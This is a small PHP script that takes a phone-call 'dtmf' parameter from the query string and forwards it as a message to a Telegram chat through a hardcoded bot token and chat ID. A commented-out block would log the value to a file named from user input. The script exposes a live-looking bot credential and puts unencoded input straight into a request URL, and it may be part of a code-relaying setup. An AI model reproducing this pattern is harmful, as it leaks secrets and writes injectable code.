<?php

$dtmf = $_GET['dtmf'];
//$uid = $_GET['uniqueid'];

$dtmf = "Posible Incoming Call from: $dtmf";


/*
// Define the file path
$file = "$uid.txt";

// The text to append
$textToAppend = "$dtmf\n";

// Append the text to the file
file_put_contents($file, $textToAppend, FILE_APPEND);

// Optional: You can also check if the operation was successful
if (file_put_contents($file, $textToAppend, FILE_APPEND) !== false) {
    echo "Text appended successfully!";
} else {
    echo "Failed to append text.";
}

*/

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . $dtmf,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$response = curl_exec($curl);

curl_close($curl);

?>
